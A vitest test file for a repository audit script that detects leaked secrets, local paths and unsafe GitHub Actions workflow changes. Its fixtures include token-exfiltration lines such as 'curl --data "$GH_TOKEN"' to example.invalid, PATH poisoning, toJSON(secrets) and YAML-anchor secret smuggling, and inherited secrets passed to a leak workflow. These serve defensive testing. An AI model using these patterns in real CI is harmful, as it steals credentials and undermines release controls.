import { describe, expect, it } from 'vitest';
import { readFile } from 'node:fs/promises';

import {
  auditPublicEntries,
  type PublicAuditEntry,
} from '../../scripts/public-repo-audit.ts';

const encoder = new TextEncoder();
const approvalWorkflowPath = decodeURIComponent(
  new URL('../../.github/workflows/approve-reviewed-content.yml', import.meta.url).pathname,
);
const releaseWorkflowPath = decodeURIComponent(
  new URL('../../.github/workflows/publish-reviewed-release.yml', import.meta.url).pathname,
);
const governanceShell = '        shell: /usr/bin/bash --noprofile --norc -euo pipefail {0}';

function file(path: string, text = 'safe public text'): PublicAuditEntry {
  return { path, type: 'file', bytes: encoder.encode(text) };
}

function findings(entries: readonly PublicAuditEntry[], branchName = 'codex/bootstrap-extraction') {
  return auditPublicEntries(entries, {
    branchName,
    requireGovernance: false,
  }).findings;
}

function mustReplaceAll(
  text: string,
  needle: string,
  replacement: string,
  expectedCount: number,
) {
  const count = text.split(needle).length - 1;
  if (count !== expectedCount) {
    throw new Error(`expected ${expectedCount} workflow mutation target(s), found ${count}`);
  }
  return text.split(needle).join(replacement);
}

function mustReplace(text: string, needle: string, replacement: string) {
  return mustReplaceAll(text, needle, replacement, 1);
}

describe('public repository disclosure audit', () => {
  it.each([
    {
      label: 'POSIX home workspace path',
      value: ['', 'home', 'example', 'private-workspace', 'project.ts'].join('/'),
      category: 'local-workspace-path',
    },
    {
      label: 'macOS mounted-volume workspace path',
      value: ['', 'Volumes', 'ExampleDrive', 'private-workspace', 'project.ts'].join('/'),
      category: 'local-workspace-path',
    },
    {
      label: 'Windows user workspace path',
      value: ['C:', 'Users', 'example', 'private-workspace', 'project.ts'].join('\\'),
      category: 'local-workspace-path',
    },
    {
      label: 'private key material',
      value: ['-----BEGIN', 'PRIVATE KEY-----'].join(' '),
      category: 'secret-pattern',
    },
    {
      label: 'classic GitHub token',
      value: `${'gh'}${'p_'}${'a'.repeat(36)}`,
      category: 'secret-pattern',
    },
    {
      label: 'fine-grained GitHub token',
      value: `${'github_'}${'pat_'}${'a'.repeat(48)}`,
      category: 'secret-pattern',
    },
  ])('rejects $label without echoing the matched value', ({ value, category }) => {
    const result = findings([file('src/example.ts', value)]);

    expect(result).toContainEqual({ category, path: 'src/example.ts' });
    expect(JSON.stringify(result)).not.toContain(value);
  });

  it.each(['.env', 'config.pem', 'server.key', 'content.db'])
  ('rejects sensitive tracked file names: %s', (path) => {
    expect(findings([file(path)]))
      .toContainEqual({ category: 'sensitive-path', path });
  });

  it('rejects symlinks and mutable external Action references', () => {
    const result = findings([
      { path: 'public/current', type: 'symlink', bytes: new Uint8Array() },
      file('.github/workflows/checks.yml', `steps:\n  - uses: actions/checkout@${'v4'}\n`),
    ]);

    expect(result).toContainEqual({ category: 'symlink', path: 'public/current' });
    expect(result).toContainEqual({ category: 'unpinned-action', path: '.github/workflows/checks.yml' });
  });

  it('rejects write permissions or secret access from read-only public CI', () => {
    const result = findings([
      file('.github/workflows/checks.yml', [
        'permissions:',
        '  contents: write',
        'jobs:',
        '  checks:',
        '    runs-on: ubuntu-latest',
        '    env:',
        '      TOKEN: ${{ secrets.CI_TOKEN }}',
        `    steps:\n      - uses: actions/checkout@${'a'.repeat(40)}`,
      ].join('\n')),
    ]);

    expect(result)
      .toContainEqual({ category: 'ci-write-boundary', path: '.github/workflows/checks.yml' });
  });

  it('rejects candidate files outside the same-date daily branch', () => {
    const candidate = file(
      'review-candidates/2026-08-26/review-manifest.json',
      '{"reviewState":"pending_owner_review","publicationState":"not_published"}',
    );

    expect(findings([candidate]))
      .toContainEqual({ category: 'candidate-branch', path: candidate.path });
    expect(findings([candidate], 'codex/stephen-daily-2026-08-25'))
      .toContainEqual({ category: 'candidate-path', path: candidate.path });
  });

  it('accepts exactly two bounded same-date candidate JSON files on a daily branch', () => {
    const date = '2026-08-26';
    const result = findings([
      file(
        `review-candidates/${date}/review-manifest.json`,
        '{"reviewState":"pending_owner_review","publicationState":"not_published"}',
      ),
      file(`review-candidates/${date}/discovery-ledger.json`, '{"runs":[]}'),
    ], `codex/stephen-daily-${date}`);

    expect(result).toEqual([]);
  });

  it('requires an MIT notice when a vendored Pretext browser bundle is present', () => {
    const fieldbook = file(
      'public/fieldbook/index.html',
      '<script>window.Pretext={layout(){}}</script>',
    );
    const missing = findings([
      fieldbook,
      file('THIRD_PARTY_NOTICES.md', 'No vendored third-party code.'),
    ]);
    const attributed = findings([
      fieldbook,
      file('THIRD_PARTY_NOTICES.md', '@chenglou/pretext\nMIT License\nPretext contributors'),
    ]);

    expect(missing).toContainEqual({
      category: 'missing-third-party-notice',
      path: 'THIRD_PARTY_NOTICES.md',
    });
    expect(attributed).not.toContainEqual(expect.objectContaining({
      category: 'missing-third-party-notice',
    }));
  });

  it('rejects a Node engine range that admits versions unsupported by the Vite toolchain', () => {
    const unsupported = findings([
      file('package.json', JSON.stringify({ engines: { node: '>=22' } })),
    ]);
    const supported = findings([
      file('package.json', JSON.stringify({ engines: { node: '>=22.12.0' } })),
    ]);

    expect(unsupported).toContainEqual({
      category: 'unsupported-node-engine',
      path: 'package.json',
    });
    expect(supported).not.toContainEqual(expect.objectContaining({
      category: 'unsupported-node-engine',
    }));
  });

  it('accepts a clean pinned workflow and ordinary public source', () => {
    const result = findings([
      file('src/main.ts', 'export const status = "public";'),
      file(
        '.github/workflows/checks.yml',
        `permissions:\n  contents: read\nsteps:\n  - uses: actions/checkout@${'a'.repeat(40)}\n`,
      ),
    ]);

    expect(result).toEqual([]);
  });

  it('accepts the trusted exact-SHA approval workflow without a custom check writer', async () => {
    const workflow = await readFile(approvalWorkflowPath, 'utf8');
    expect(findings([
      file('.github/workflows/approve-reviewed-content.yml', workflow),
    ])).toEqual([]);
    expect(workflow).not.toContain('checks: write');
    expect(workflow).not.toContain('repos/$GH_REPO/check-runs');
  });

  it('rejects unsafe reviewed-release permissions, runner surfaces and mutable operations', () => {
    const path = '.github/workflows/approve-reviewed-content.yml';
    const unsafe = [
      'on: workflow_dispatch',
      'permissions:',
      '  contents: write',
      '  deployments: write',
      'jobs:',
      '  approve:',
      '    runs-on: self-hosted',
      '    environment: production',
      '    steps:',
      '      - run: ssh example.invalid',
    ].join('\n');
    const result = findings([file(path, unsafe)]);

    expect(result).toContainEqual({ category: 'reviewed-workflow-permissions', path });
    expect(result).toContainEqual({ category: 'reviewed-workflow-boundary', path });
    expect(result).toContainEqual({ category: 'reviewed-workflow-contract', path });
  });

  it('accepts the owner-only durable-artifact Release recovery workflow', async () => {
    const workflow = await readFile(releaseWorkflowPath, 'utf8');
    expect(findings([
      file('.github/workflows/publish-reviewed-release.yml', workflow),
    ])).toEqual([]);
    expect(workflow).toContain('workflow_dispatch:');
    expect(workflow).toContain('approval_run_id:');
    expect(workflow).toContain('approval_run_attempt:');
    expect(workflow).toContain('pull-requests: read');
    expect(workflow).toContain('secrets.STEPHEN_RELEASE_GOVERNANCE_TOKEN');
    expect(workflow).not.toContain('commits/$SEAL_SHA/check-runs');
    expect(workflow.match(
      /shell: \/usr\/bin\/bash --noprofile --norc -euo pipefail \{0\}/g,
    ) ?? []).toHaveLength(2);
  });

  it('rejects a Release workflow without pull-request read permission', async () => {
    const path = '.github/workflows/publish-reviewed-release.yml';
    const workflow = await readFile(releaseWorkflowPath, 'utf8');
    const missingPullRequestRead = mustReplace(workflow, '  pull-requests: read\n', '');

    expect(findings([file(path, missingPullRequestRead)]))
      .toContainEqual({ category: 'reviewed-workflow-permissions', path });
  });

  it('rejects a reviewed workflow job-level permission override', async () => {
    const path = '.github/workflows/publish-reviewed-release.yml';
    const workflow = await readFile(releaseWorkflowPath, 'utf8');
    const jobOverride = mustReplace(
      workflow,
      '  release:\n    if:',
      '  release:\n    permissions: write-all\n    if:',
    );

    expect(findings([file(path, jobOverride)]))
      .toContainEqual({ category: 'reviewed-workflow-permissions', path });

    const quotedJobOverride = mustReplace(
      workflow,
      '  release:\n    if:',
      '  release:\n    "permissions": write-all\n    if:',
    );
    expect(findings([file(path, quotedJobOverride)]))
      .toContainEqual({ category: 'reviewed-workflow-permissions', path });

    const mergedJobOverride = mustReplace(
      workflow,
      'jobs:\n  release:',
      [
        'x-privileged: &privileged',
        '  permissions: write-all',
        '',
        'jobs:',
        '  release:',
        '    <<: *privileged',
      ].join('\n'),
    );
    expect(findings([file(path, mergedJobOverride)]))
      .toContainEqual({ category: 'reviewed-workflow-permissions', path });
  });

  it('rejects restoring fail-open optional tag reads', async () => {
    const path = '.github/workflows/publish-reviewed-release.yml';
    const workflow = await readFile(releaseWorkflowPath, 'utf8');
    const failOpenReads = mustReplaceAll(
      workflow,
      'bash trusted/scripts/github-api-read-optional.sh',
      'gh api --method GET || printf "null\\n" #',
      2,
    );

    expect(findings([file(path, failOpenReads)]))
      .toContainEqual({ category: 'reviewed-workflow-contract', path });
  });

  it('rejects any unapproved governance secret name or placement', async () => {
    const path = '.github/workflows/publish-reviewed-release.yml';
    const workflow = await readFile(releaseWorkflowPath, 'utf8');
    const wrongName = mustReplaceAll(
      workflow,
      'secrets.STEPHEN_RELEASE_GOVERNANCE_TOKEN',
      'secrets.OTHER_TOKEN',
      2,
    );
    const movedIntoBuild = mustReplace(
      mustReplace(
        workflow,
        [
          'name: Read fail-closed repository governance facts',
          governanceShell,
          '        env:',
          '          GH_TOKEN: ${{ secrets.STEPHEN_RELEASE_GOVERNANCE_TOKEN }}',
        ].join('\n'),
        [
          'name: Read fail-closed repository governance facts',
          governanceShell,
          '        env:',
          '          GH_TOKEN: disabled',
        ].join('\n'),
      ),
        'working-directory: release\n        env:\n          SEAL_SHA: ${{ steps.handoff.outputs.seal_sha }}',
        [
          'working-directory: release',
          '        env:',
          '          SEAL_SHA: ${{ steps.handoff.outputs.seal_sha }}',
          '          LEAKED_GOVERNANCE_TOKEN: ${{ secrets.STEPHEN_RELEASE_GOVERNANCE_TOKEN }}',
        ].join('\n'),
    );

    expect(findings([file(path, wrongName)]))
      .toContainEqual({ category: 'reviewed-workflow-boundary', path });
    expect(findings([file(path, movedIntoBuild)]))
      .toContainEqual({ category: 'reviewed-workflow-boundary', path });
  });

  it('binds the governance token to the exact parsed env paths', async () => {
    const path = '.github/workflows/publish-reviewed-release.yml';
    const workflow = await readFile(releaseWorkflowPath, 'utf8');
    const escapedIntoBuild = mustReplace(
      mustReplace(
        workflow,
        [
          'name: Refresh governance facts before immutable publication',
          "        if: steps.policy.outputs.status != 'already_immutable'",
          governanceShell,
          '        env:',
          '          GH_TOKEN: ${{ secrets.STEPHEN_RELEASE_GOVERNANCE_TOKEN }}',
        ].join('\n'),
        [
          'name: Refresh governance facts before immutable publication',
          "        if: steps.policy.outputs.status != 'already_immutable'",
          governanceShell,
          '        env:',
          '          GH_TOKEN: disabled # ${{ secrets.STEPHEN_RELEASE_GOVERNANCE_TOKEN }}',
        ].join('\n'),
      ),
      'working-directory: release\n        env:\n          SEAL_SHA: ${{ steps.handoff.outputs.seal_sha }}',
      [
        'working-directory: release',
        '        env:',
        '          SEAL_SHA: ${{ steps.handoff.outputs.seal_sha }}',
        '          LEAKED_GOVERNANCE_TOKEN: "${{ se\\u0063rets.STEPHEN_RELEASE_GOVERNANCE_TOKEN }}"',
      ].join('\n'),
    );
    const wrongEnvKey = mustReplace(
      workflow,
      [
        'name: Read fail-closed repository governance facts',
        governanceShell,
        '        env:',
        '          GH_TOKEN: ${{ secrets.STEPHEN_RELEASE_GOVERNANCE_TOKEN }}',
      ].join('\n'),
      [
        'name: Read fail-closed repository governance facts',
        governanceShell,
        '        env:',
        '          READ_TOKEN: ${{ secrets.STEPHEN_RELEASE_GOVERNANCE_TOKEN }}',
      ].join('\n'),
    );

    expect(findings([file(path, escapedIntoBuild)]))
      .toContainEqual({ category: 'reviewed-workflow-boundary', path });
    expect(findings([file(path, wrongEnvKey)]))
      .toContainEqual({ category: 'reviewed-workflow-boundary', path });
  });

  it('requires both governance-token steps to keep the exact read-only command contract', async () => {
    const path = '.github/workflows/publish-reviewed-release.yml';
    const workflow = await readFile(releaseWorkflowPath, 'utf8');
    const exfiltration = mustReplace(
      workflow,
      [
        '          gh api --method GET "repos/$GH_REPO/rulesets/$tag_ruleset_id" \\',
        '            > "$RUNNER_TEMP/saas-608-tag-ruleset.json"',
      ].join('\n'),
      [
        '          gh api --method GET "repos/$GH_REPO/rulesets/$tag_ruleset_id" \\',
        '            > "$RUNNER_TEMP/saas-608-tag-ruleset.json"',
        '          curl --data "$GH_TOKEN" https://example.invalid/collect',
      ].join('\n'),
    );
    const mutation = mustReplace(
      workflow,
      [
        '          gh api --method GET "repos/$GH_REPO/immutable-releases" \\',
        '            > "$RUNNER_TEMP/saas-608-immutability.json"',
      ].join('\n'),
      [
        '          gh api --method DELETE "repos/$GH_REPO/immutable-releases" \\',
        '            > "$RUNNER_TEMP/saas-608-immutability.json"',
      ].join('\n'),
    );

    expect(findings([file(path, exfiltration)]))
      .toContainEqual({ category: 'reviewed-workflow-boundary', path });
    expect(findings([file(path, mutation)]))
      .toContainEqual({ category: 'reviewed-workflow-boundary', path });
  });

  it('rejects inherited or containerized execution contexts for reviewed workflows', async () => {
    const path = '.github/workflows/publish-reviewed-release.yml';
    const workflow = await readFile(releaseWorkflowPath, 'utf8');
    const jobDefaults = mustReplace(
      workflow,
      '  release:\n    if:',
      [
        '  release:',
        '    defaults:',
        '      run:',
        "        shell: bash -c 'curl --data \"$GH_TOKEN\" https://example.invalid; source \"$1\"' -- {0}",
        '    if:',
      ].join('\n'),
    );
    const jobContainer = mustReplace(
      workflow,
      '    runs-on: ubuntu-latest\n    timeout-minutes: 25',
      [
        '    runs-on: ubuntu-latest',
        '    container: ghcr.io/example/leaking-runner:latest',
        '    timeout-minutes: 25',
      ].join('\n'),
    );
    const workflowDefaults = mustReplace(
      workflow,
      'jobs:\n  release:',
      [
        'defaults:',
        '  run:',
        '    shell: custom-shell {0}',
        '',
        'jobs:',
        '  release:',
      ].join('\n'),
    );
    const unexpectedStep = mustReplace(
      workflow,
      '    steps:\n      - name: Resolve and authenticate the exact source approval run',
      [
        '    steps:',
        '      - name: Poison later command lookup',
        '        run: echo /tmp/attacker >> "$GITHUB_PATH"',
        '      - name: Resolve and authenticate the exact source approval run',
      ].join('\n'),
    );

    for (const unsafe of [jobDefaults, jobContainer, workflowDefaults, unexpectedStep]) {
      expect(findings([file(path, unsafe)]))
        .toContainEqual({ category: 'reviewed-workflow-boundary', path });
    }
  });

  it('locates governance steps structurally instead of relying on field order', async () => {
    const path = '.github/workflows/publish-reviewed-release.yml';
    const workflow = await readFile(releaseWorkflowPath, 'utf8');
    const reorderedMetadata = mustReplace(
      workflow,
      '      - name: Read fail-closed repository governance facts',
      [
        '      - id: governance-preflight',
        '        name: Read fail-closed repository governance facts',
      ].join('\n'),
    );

    expect(findings([file(path, reorderedMetadata)]))
      .not.toContainEqual({ category: 'reviewed-workflow-boundary', path });
  });

  it('rejects the governance token from a Release mutation step', async () => {
    const path = '.github/workflows/publish-reviewed-release.yml';
    const workflow = await readFile(releaseWorkflowPath, 'utf8');
    const movedIntoPublish = mustReplace(
      mustReplace(
        workflow,
        [
          'name: Read fail-closed repository governance facts',
          governanceShell,
          '        env:',
          '          GH_TOKEN: ${{ secrets.STEPHEN_RELEASE_GOVERNANCE_TOKEN }}',
        ].join('\n'),
        [
          'name: Read fail-closed repository governance facts',
          governanceShell,
          '        env:',
          '          GH_TOKEN: disabled',
        ].join('\n'),
      ),
        'name: Publish the complete Release\n        if:',
        [
          'name: Publish the complete Release',
          '        env:',
          '          LEAKED_GOVERNANCE_TOKEN: ${{ secrets.STEPHEN_RELEASE_GOVERNANCE_TOKEN }}',
          '        if:',
        ].join('\n'),
    );

    expect(findings([file(path, movedIntoPublish)]))
      .toContainEqual({ category: 'reviewed-workflow-boundary', path });
  });

  it('rejects bracket-syntax access to any additional secret', async () => {
    const path = '.github/workflows/publish-reviewed-release.yml';
    const workflow = await readFile(releaseWorkflowPath, 'utf8');
    const bracketSecret = mustReplace(
      workflow,
      [
        'name: Publish the complete Release',
        "        if: steps.policy.outputs.status != 'already_immutable'",
        '        env:',
        '          GITHUB_TOKEN: ${{ github.token }}',
      ].join('\n'),
      [
        'name: Publish the complete Release',
        "        if: steps.policy.outputs.status != 'already_immutable'",
        '        env:',
        '          GITHUB_TOKEN: ${{ github.token }}',
        "          LEAKED_TOKEN: ${{ secrets['OTHER_TOKEN'] }}",
      ].join('\n'),
    );

    expect(findings([file(path, bracketSecret)]))
      .toContainEqual({ category: 'reviewed-workflow-boundary', path });

    const indirectSecret = mustReplace(
      workflow,
      [
        'name: Publish the complete Release',
        "        if: steps.policy.outputs.status != 'already_immutable'",
        '        env:',
        '          GITHUB_TOKEN: ${{ github.token }}',
      ].join('\n'),
      [
        'name: Publish the complete Release',
        "        if: steps.policy.outputs.status != 'already_immutable'",
        '        env:',
        '          GITHUB_TOKEN: ${{ github.token }}',
        '          LEAKED_TOKEN: ${{ toJSON(secrets) }}',
      ].join('\n'),
    );
    expect(findings([file(path, indirectSecret)]))
      .toContainEqual({ category: 'reviewed-workflow-boundary', path });

    const anchoredSecret = mustReplace(
      mustReplace(
        workflow,
        [
          'name: Read fail-closed repository governance facts',
          governanceShell,
          '        env:',
          '          GH_TOKEN: ${{ secrets.STEPHEN_RELEASE_GOVERNANCE_TOKEN }}',
        ].join('\n'),
        [
          'name: Read fail-closed repository governance facts',
          governanceShell,
          '        env:',
          '          GH_TOKEN: &governance-token ${{ secrets.STEPHEN_RELEASE_GOVERNANCE_TOKEN }}',
        ].join('\n'),
      ),
      [
        'name: Publish the complete Release',
        "        if: steps.policy.outputs.status != 'already_immutable'",
        '        env:',
        '          GITHUB_TOKEN: ${{ github.token }}',
      ].join('\n'),
      [
        'name: Publish the complete Release',
        "        if: steps.policy.outputs.status != 'already_immutable'",
        '        env:',
        '          GITHUB_TOKEN: ${{ github.token }}',
        '          LEAKED_TOKEN: *governance-token',
      ].join('\n'),
    );
    expect(findings([file(path, anchoredSecret)]))
      .toContainEqual({ category: 'reviewed-workflow-boundary', path });
  });

  it('rejects reusable-workflow secret inheritance from a reviewed workflow', async () => {
    const path = '.github/workflows/publish-reviewed-release.yml';
    const workflow = await readFile(releaseWorkflowPath, 'utf8');
    const inheritedSecrets = mustReplace(
      workflow,
      'jobs:\n  release:',
      [
        'jobs:',
        '  inherited-secret-leak:',
        `    uses: ZiZ-LG/example/.github/workflows/leak.yml@${'a'.repeat(40)}`,
        '    secrets: inherit',
        '  release:',
      ].join('\n'),
    );

    expect(findings([file(path, inheritedSecrets)]))
      .toContainEqual({ category: 'reviewed-workflow-boundary', path });
  });

  it('rejects the governance token from the approval workflow', async () => {
    const path = '.github/workflows/approve-reviewed-content.yml';
    const workflow = await readFile(approvalWorkflowPath, 'utf8');
    const unsafe = mustReplace(
      workflow,
      'permissions:',
      'env:\n  GH_TOKEN: ${{ secrets.STEPHEN_RELEASE_GOVERNANCE_TOKEN }}\n\npermissions:',
    );

    expect(findings([file(path, unsafe)]))
      .toContainEqual({ category: 'reviewed-workflow-boundary', path });
  });

  it('rejects recovery without owner/default-branch guards or with a restored check dependency', async () => {
    const path = '.github/workflows/publish-reviewed-release.yml';
    const workflow = await readFile(releaseWorkflowPath, 'utf8');
    const missingGuard = mustReplace(
      workflow,
      '[[ "$CURRENT_REF" == "$DEFAULT_BRANCH" ]]',
      'true',
    );
    const restoredCheckPermission = mustReplace(
      workflow,
      '  actions: read',
      '  actions: read\n  checks: read',
    );
    const restoredCheckApi = mustReplace(
      workflow,
      'gh api --method GET "repos/$GH_REPO/pulls/$PR_NUMBER"',
      [
        'gh api --method GET "repos/$GH_REPO/commits/$SEAL_SHA/check-runs"',
        '          gh api --method GET "repos/$GH_REPO/pulls/$PR_NUMBER"',
      ].join('\n'),
    );

    expect(findings([file(path, missingGuard)]))
      .toContainEqual({ category: 'reviewed-workflow-contract', path });
    expect(findings([file(path, restoredCheckPermission)]))
      .toEqual(expect.arrayContaining([
        { category: 'reviewed-workflow-permissions', path },
        { category: 'reviewed-workflow-contract', path },
      ]));
    expect(findings([file(path, restoredCheckApi)]))
      .toContainEqual({ category: 'reviewed-workflow-contract', path });
  });

  it('rejects a Release workflow that has extra permissions or omits immutable final-state proof', () => {
    const path = '.github/workflows/publish-reviewed-release.yml';
    const unsafe = [
      'on:',
      '  repository_dispatch:',
      'permissions:',
      '  contents: write',
      '  pull-requests: write',
      'jobs:',
      '  release:',
      '    runs-on: ubuntu-latest',
      '    steps:',
      '      - run: echo mutable',
    ].join('\n');
    const result = findings([file(path, unsafe)]);

    expect(result).toContainEqual({ category: 'reviewed-workflow-permissions', path });
    expect(result).toContainEqual({ category: 'reviewed-workflow-contract', path });
  });
});
